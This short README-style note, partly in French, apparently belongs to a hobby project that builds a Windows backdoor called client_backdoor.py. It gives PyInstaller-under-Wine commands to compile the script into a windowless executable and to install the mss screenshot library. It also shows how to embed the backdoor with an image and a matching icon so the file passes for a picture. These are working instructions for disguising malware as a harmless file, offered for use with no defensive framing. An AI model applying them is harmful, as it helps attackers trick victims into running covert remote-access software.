# Backdoor on windows 
	
	wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe client_backdoor.py --onefile --noconsole

The *.exe file is in dist/

# Installing mss library with pip :
`wine /root/.wine/drive_c/pyinstaller.exe -m pip install mss==4.0.2`  --> Tout simplement ...

# Embedding backdoor in a image 
		
	wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "<path_to_your_image>;." --onefile --noconsole --icon <path_to_your_.ico> client_backdoor.py

In order to make a .ico go to --> `https://convertico.com/jpg-to-ico/` --> create the .ico